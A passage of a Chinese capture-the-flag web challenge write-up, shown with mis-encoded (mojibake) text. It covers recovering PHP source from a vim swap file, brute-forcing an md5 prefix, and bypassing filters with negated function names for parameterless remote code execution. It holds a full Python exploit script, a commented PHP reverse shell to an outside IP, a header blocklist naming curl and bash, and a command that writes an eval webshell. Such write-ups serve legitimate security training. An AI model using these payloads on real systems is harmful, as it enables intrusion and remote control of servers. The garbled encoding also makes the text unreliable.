ä¸æ‹¿åˆ°shellç›´æ¥åˆ©ç”¨cat &#x2F;flagçš„è¯æ˜¯çœ‹ä¸åˆ°çœŸæ­£çš„flagçš„ï¼Œä½ éœ€è¦æ‰¾åˆ°é‚£ä¸ªéšè—çš„æ–‡ä»¶&#x2F;.true_flagæ‰å¯ä»¥æ‹¿åˆ°flagã€‚å¦å¤–ï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åå¼¹çš„shellæ‹¿åˆ°çš„æ˜¯rootæƒé™ï¼Œå…·ä½“åŸå› æ¯”è¾ƒå¤æ‚ï¼Œåœ¨è¿™é‡Œä¸ä½œè§£é‡Šã€‚ä½ å¯ä»¥åˆ©ç”¨è¿™ä¸ªæƒé™æ¥å®Œæˆç ´åé¶æœºç­‰æ“ä½œã€‚ï¼ˆæ¯”èµ›æœªå…è®¸çš„æƒ…å†µçš„ä¸‹è¿˜æ˜¯ä¸è¦åšï¼‰</p><h3 id="åˆ©ç”¨å·¥å…·Gopheruså¾—åˆ°payload"><a href="#åˆ©ç”¨å·¥å…·Gopheruså¾—åˆ°payload" class="headerlink" title="åˆ©ç”¨å·¥å…·Gopheruså¾—åˆ°payload"></a>åˆ©ç”¨å·¥å…·Gopheruså¾—åˆ°payload</h3><p><strong>æ³¨æ„</strong>ï¼Œåœ¨ä½¿ç”¨ä¸€äº›å·¥å…·çš„åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿåº”å½“äº†è§£è§£å†³é—®é¢˜çš„åŸç†ã€‚ä¸è¦æ— è„‘ä½¿ç”¨ç½‘ä¸Šå·²ç»å†™å¥½çš„å·¥å…·ï¼Œé¿å…æˆä¸º<strong>â€œScript Kidâ€</strong>ã€‚</p><p><a href="https://pic.imgdb.cn/item/6266882b239250f7c593652b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6266882b239250f7c593652b.png"></a></p><p>Gopherusé¡¹ç›®åœ°å€:<a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p>è¿™ä¸ªå·¥å…·æ— æ³•æ·»åŠ redisçš„authå‘½ä»¤ï¼Œå› æ­¤é€šè¿‡è¯¥å·¥å…·å¾—åˆ°çš„payloadåœ¨æœ¬é¢˜ä¸­æ— æ³•ç›´æ¥ä½¿ç”¨ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æŒ‰ç…§redisæ•°æ®åŒ…çš„æ ¼å¼å’Œgopheråè®®çš„æ ¼å¼è‡ªè¡Œæ·»åŠ authå‘½ä»¤ï¼ŒåŒæ—¶ä¸è¦å¿˜è®°æ›´æ”¹<code>_</code>ä¸ºå…¶ä»–ä»»ä½•å­—ç¬¦ã€‚</p><h2 id="ä¸»äººçš„å‘½ä»¤"><a href="#ä¸»äººçš„å‘½ä»¤" class="headerlink" title="ä¸»äººçš„å‘½ä»¤"></a>ä¸»äººçš„å‘½ä»¤</h2><h3 id="è·å–çº¿ç´¢-1"><a href="#è·å–çº¿ç´¢-1" class="headerlink" title="è·å–çº¿ç´¢"></a>è·å–çº¿ç´¢</h3><p>æ‰“å¼€ç¯å¢ƒï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå’Œè”¼çš„å¤´åƒï¼Œä½†æ˜¯è¿™ä¸é‡è¦ã€‚æŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°ä¸€ä¸ªhintï¼š</p><p><a href="https://pic.imgdb.cn/item/626688a3239250f7c5946bfa.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688a3239250f7c5946bfa.png"></a></p><p>vimæ˜¯ç›®å‰è¿ç”¨å¾—æœ€å¤šçš„Linuxç¼–è¾‘å™¨ï¼Œå½“ç”¨æˆ·åœ¨ç¼–è¾‘æ–‡ä»¶ä½†æ„å¤–é€€å‡ºæ—¶ï¼ˆå¦‚é€šè¿‡SSHè¿æ¥åˆ°æœåŠ¡å™¨æ—¶ï¼Œåœ¨ç”¨vimç¼–è¾‘æ–‡ä»¶çš„è¿‡ç¨‹ä¸­å¯èƒ½é‡åˆ°å› ä¸ºç½‘é€Ÿä¸å¤Ÿå¯¼è‡´çš„å‘½ä»¤è¡Œå¡æ­»è€Œæ„å¤–é€€å‡ºçš„æƒ…å†µï¼‰ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œæ–‡ä»¶åæ ¼å¼ä¸ºï¼š<code>.æ–‡ä»¶å.swp</code></p><p>å…ˆå°è¯•çˆ†ç ´ä¸€ä¸‹ç›®å½•ï¼š</p><p><a href="https://pic.imgdb.cn/item/626688b1239250f7c5948fdc.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688b1239250f7c5948fdc.png"></a></p><p>å‘ç°index.phpï¼Œè¾“å…¥.index.php.swpå³å¯å¾—åˆ°å¤‡ä»½æ–‡ä»¶ã€‚é’ˆå¯¹SWPå¤‡ä»½æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨â€œvim-râ€å‘½ä»¤æ¢å¤æ–‡ä»¶çš„å†…å®¹ï¼š</p><p><a href="https://pic.imgdb.cn/item/626688be239250f7c594acee.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688be239250f7c594acee.png"></a></p><p>æ¥ç€æŒ‰ä¸‹escï¼Œè¾“å…¥<code>:wq</code> å³å¯å°†å…¶ä¿å­˜ä¸ºindex.phpï¼ˆç®€å•çš„vimä½¿ç”¨å‘½ä»¤ï¼Œå¦‚æœè¿™äº›è¿˜ä¸ç†Ÿæ‚‰çš„è¯ï¼Œå¯ä»¥å…ˆå»å­¦ä¹ linuxçš„åŸºç¡€å‘½ä»¤ï¼‰ã€‚å¾—åˆ°ç½‘ç«™æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mingling&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;snert&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;snert&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;ä¸å¯¹åŠ²ï¼\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line">    <span class="variable">$snert</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mingling&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$snert</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|`|&quot;|\ |\.|,|\+|=|-|\\|\/|&gt;|&lt;|\?|\^|\$|\||&amp;|[A-Za-z0-9]/ixm&#x27;</span>,<span class="variable">$snert</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;å¹²å•¥ï¼Ÿå°hacker\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$snert</span>))&#123;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="title function_ invoke__">getallheaders</span>();</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$headers</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/as|\||per|openssl|curl|rm |et|bash|post|ls|flag/&#x27;</span>,<span class="variable">$var</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;ä½ èƒ½ç†è§£æˆ‘æƒ³è¦è¿‡æ»¤ä»€ä¹ˆå—ï¼Ÿå¦‚æœä½ å¯ä»¥ç†è§£çš„è¯ï¼Œé‚£ä¹ˆä½ åº”è¯¥å‘ç°æˆ‘å·²ç»æ— è„‘è¿‡æ»¤äº†ä¸€åˆ‡ï¼Œä¸æ˜¯å—ï¼Ÿ\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$snert</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å®¡è®¡ä»£ç "><a href="#å®¡è®¡ä»£ç " class="headerlink" title="å®¡è®¡ä»£ç "></a>å®¡è®¡ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™é‡Œå°†$_SESSION[â€˜snertâ€™]çš„å€¼è®¾ä¸ºä¸€ä¸ªéšæœºæ•°çš„md5å€¼çš„å‰å…­ä½ã€‚</p><p>æ¥ç€éœ€è¦ä¼ å…¥ä¸¤ä¸ªPOSTå‹å‚æ•°ï¼Œä¸€ä¸ªåä¸ºminglingï¼Œä¸€ä¸ªåä¸ºsnertã€‚æ¥ç€çœ‹è¿™æ®µä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;snert&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;ä¸å¯¹åŠ²ï¼\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹ä¼ å…¥çš„å‚æ•°snertçš„md5å€¼çš„å‰å…­ä½è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸ç­‰äº$_SESSION[â€˜snertâ€™]ï¼Œå°±ä¼šé€€å‡ºç¨‹åºï¼Œå¹¶å¼¹çª—æç¤ºâ€œä¸å¯¹åŠ²â€ã€‚è¿™é‡Œæ˜¯ä¸€ä¸ªå¾ˆå¸¸è§çš„md5æˆªæ–­ç»•è¿‡ã€‚</p><p>æ¥ç€å®¡è®¡ï¼Œå‘ç°è¿™é‡Œåˆå¯¹æˆ‘ä»¬ä¸Šä¼ çš„minglingå‚æ•°è¿›è¡Œäº†ä¸€äº›åˆ¤æ–­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$snert</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|`|&quot;|\ |\.|,|\+|=|-|\\|\/|&gt;|&lt;|\?|\^|\$|\||&amp;|[A-Za-z0-9]/ixm&#x27;</span>,<span class="variable">$snert</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;å¹²å•¥ï¼Ÿå°hacker\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$snert</span>))&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$snert</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>mingling</code>çš„é•¿åº¦å¤§äº70æˆ–åŒ¹é…åˆ°äº†ä¸€äº›å¯ç–‘å­—ç¬¦å°±ä¼šé€€å‡ºç¨‹åºå¹¶å¼¹çª—æç¤ºâ€œå¹²å•¥ï¼Œå°hackerâ€ï¼Œè¿™é‡Œå¯¹è¾“å…¥çš„minglingå‚æ•°è¿›è¡Œäº†å¤§é‡çš„è¿‡æ»¤ã€‚æ¥ç€else ifä¸­è¦æ±‚minglingèƒ½å¤ŸåŒ¹é…<code>/[^\s\(\)]+?\((?R)?\)/</code>è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œä¸”è¿˜èƒ½å¤šå‡ºä¸€ä¸ªåˆ†å·ã€‚æœ€åå°†minglingå‚æ•°æ”¾å…¥evalå‡½æ•°ä¸­æ‰§è¡Œã€‚</p><p>é¦–å…ˆæˆ‘ä»¬çœ‹ä¸‹è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼š</p><p><a href="https://pic.imgdb.cn/item/626688cf239250f7c594d5bf.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688cf239250f7c594d5bf.png"></a></p><p>å‘ç°å®ƒè¦æ±‚æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å¿…é¡»ä¸ºå¦‚ä¸‹æ ¼å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a()</span><br><span class="line">a(b())</span><br><span class="line">a(b(c()))</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™æ˜¯å¾ˆå…¸å‹çš„æ— å‚æ•°RCEï¼ˆ<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">æ— å‚æ•°RCEä»‹ç»</a>ï¼‰</p><h3 id="ç¼–å†™EXP"><a href="#ç¼–å†™EXP" class="headerlink" title="ç¼–å†™EXP"></a>ç¼–å†™EXP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$snert</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|`|&quot;|\ |\.|,|\+|=|-|\\|\/|&gt;|&lt;|\?|\^|\$|\||&amp;|[A-Za-z0-9]/ixm&#x27;</span>,<span class="variable">$snert</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;å¹²å•¥ï¼Ÿå°hacker\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿‡æ»¤äº†å¤§é‡çš„å­—ç¬¦ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥é€šè¿‡å–åè¿›è¡Œç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;snert&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;ä¸å¯¹åŠ²ï¼\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹è¾“å…¥çš„snertå‚æ•°çš„å€¼è¿›è¡Œäº†æ£€æµ‹ï¼Œç›´æ¥æš´åŠ›éå†1-99999999ä¹‹é—´çš„æ•°å­—ï¼Œç„¶åæ‰¾åˆ°md5åŠ å¯†åçš„å­—ç¬¦ä¸²çš„å‰å…­ä½ä¸é¢˜ç›®æ‰€ç»™çš„å…­ä½å­—ç¬¦ä¸²ç›¸åŒçš„é‚£ä¸ªæ•°å­—å³å¯ã€‚</p><p>ç›´æ¥ç»™å‡ºEXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://web.snert.cn:8003/&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;6d566721c135ead420877d4b266b2cdb&#x27;</span>&#125;<span class="comment">#éœ€è¦è®¾ç½®cookieï¼Œå¦åˆ™$_SESSION[&#x27;snert&#x27;]çš„å€¼éšç€æˆ‘ä»¬æ¯æ¬¡getéƒ½ä¼šæ”¹å˜</span></span><br><span class="line">data = &#123;<span class="string">&#x27;mingling&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;snert&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">req = requests.get(url,cookies=cookies)</span><br><span class="line">ret = re.findall(<span class="string">&#x27;==[a-z0-9]&#123;6&#125;&#x27;</span>,req.text)<span class="comment">#æ‰¾åˆ°å½¢å¦‚==f2aeb0çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">match</span> = ret[<span class="number">0</span>][<span class="number">2</span>:<span class="number">8</span>]<span class="comment">#æˆªå–==f2aeb0çš„åå…­ä½å­—ç¬¦ï¼Œå³f2aeb0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()<span class="comment">#è¿”å›md5(s)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_snert</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">99999999</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">6</span>]  == <span class="built_in">str</span>(s):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(i)       <span class="comment">#æš´åŠ›éå†ï¼Œç›´åˆ°æ‰¾åˆ°ç¬¦åˆçš„i</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">one</span>(<span class="params">s</span>):</span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">255</span> - <span class="built_in">ord</span>(each)))[<span class="number">2</span>:].upper()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;[~<span class="subst">&#123;ss&#125;</span>][!%FF](&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mingling</span>():</span><br><span class="line">    <span class="comment"># a = &#x27;var_dump(getallheaders());&#x27; #å¯ä»¥å…ˆåˆ©ç”¨è¿™ç§æ–¹æ³•æ‰¾åˆ°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„headers</span></span><br><span class="line">    a = <span class="string">&#x27;system(end(getallheaders()));&#x27;</span></span><br><span class="line">    aa = a.split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> aa[:-<span class="number">1</span>]:</span><br><span class="line">        s += one(each)</span><br><span class="line">    s += <span class="string">&quot;)&quot;</span> * (<span class="built_in">len</span>(aa) - <span class="number">1</span>) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data[<span class="string">&#x27;mingling&#x27;</span>] = get_mingling()</span><br><span class="line">    data[<span class="string">&#x27;snert&#x27;</span>] = get_snert(<span class="keyword">match</span>)</span><br><span class="line">    <span class="comment"># headers = &#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;,&#x27;Upgrade-Insecure-Requests&#x27;:&#x27;php -r \&#x27;$sock=fsockopen(&quot;110.42.234.56&quot;,9200);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#x27;&#x27;&#125;</span></span><br><span class="line">    <span class="comment"># req = requests.post(url,data,)</span></span><br><span class="line">    payload = <span class="string">&#x27;mingling=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(data[<span class="string">&#x27;mingling&#x27;</span>])+<span class="string">&#x27;&amp;&#x27;</span>+<span class="string">&#x27;snert=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(data[<span class="string">&#x27;snert&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>var_dump(getallheaders())</code>æ¥æŸ¥çœ‹å¯ä»¥åˆ©ç”¨çš„headersæœ‰å“ªäº›ï¼š</p><p><a href="https://pic.imgdb.cn/item/626688de239250f7c594fb28.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688de239250f7c594fb28.png"></a></p><p>æˆ‘ä»¬å‘ç°<code>current(getallheaders())</code>æ˜¯Hostï¼Œè¿™ä¸ªä¸èƒ½ä¿®æ”¹ï¼Œ<code>next(getallheaders())</code>æ˜¯user-agentå¯ä»¥ä¿®æ”¹ï¼Œ<code>end(getallheaders())</code>æ˜¯Upgrade-Insecure-Requestsï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹ã€‚è¿™é‡Œä»¥<code>Upgrade-Insecure-Requests</code>ä¸ºä¾‹ï¼Œå…ˆæ‹¿åˆ°æˆ‘ä»¬éœ€è¦postçš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨è„šæœ¬æ‹¿åˆ°<code>system(end(getallheaders()));</code>çš„å–åï¼Œç„¶åä¿®æ”¹<code>Upgrade-Insecure-Requests</code>ä¸ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚è¿™æ ·å°±å°†<code>Upgrade-Insecure-Requests</code>ä½œä¸ºäº†å‘½ä»¤æ‰§è¡Œå‡½æ•°systemçš„å‚æ•°ã€‚å¯æ˜¯è¿™é‡Œå¯¹headersä¹Ÿè¿›è¡Œäº†è¿‡æ»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach ($headers as $var)&#123;</span><br><span class="line">            if (preg_match(&#x27;/as|\||per|openssl|curl|rm |et|bash|post|ls|flag/&#x27;,$var)) &#123;</span><br><span class="line">                die(&#x27;&lt;script&gt;alert(\&#x27;ä½ èƒ½ç†è§£æˆ‘æƒ³è¦è¿‡æ»¤ä»€ä¹ˆå—ï¼Ÿå¦‚æœä½ å¯ä»¥ç†è§£çš„è¯ï¼Œé‚£ä¹ˆä½ åº”è¯¥å‘ç°æˆ‘å·²ç»æ— è„‘è¿‡æ»¤äº†ä¸€åˆ‡ï¼Œä¸æ˜¯å—ï¼Ÿ\&#x27;);history.back()&lt;/script&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®è¿™é‡Œè¿‡æ»¤çš„å·²ç»å¾ˆæ˜æ˜¾äº†ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢æˆ‘ä»¬åå¼¹shellï¼Œä½†æ˜¯è¿™é‡Œç»™æ”¾å¼€äº†phpï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨phpä¸€å¥è¯åå¼¹shellã€‚ä½†æ˜¯å…¶å®ä¸éœ€è¦åå¼¹shellï¼Œç›´æ¥å†™å…¥webshellä¹Ÿå¯ä»¥ã€‚</p><h3 id="å†™å…¥webshell"><a href="#å†™å…¥webshell" class="headerlink" title="å†™å…¥webshell"></a>å†™å…¥webshell</h3><p>é¦–å…ˆåˆ©ç”¨è„šæœ¬ç”Ÿæˆæˆ‘ä»¬æƒ³è¦ä¸Šä¼ çš„payloadï¼š</p><p><a href="https://pic.imgdb.cn/item/626688ed239250f7c595205b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688ed239250f7c595205b.png"></a></p><p>æ¥ç€æˆ‘ä»¬æ›´æ”¹<code>Upgrade-Insecure-Requests</code>ä¸ºå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> shell.php &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[shell]);?&gt;&#x27;</span> &gt; 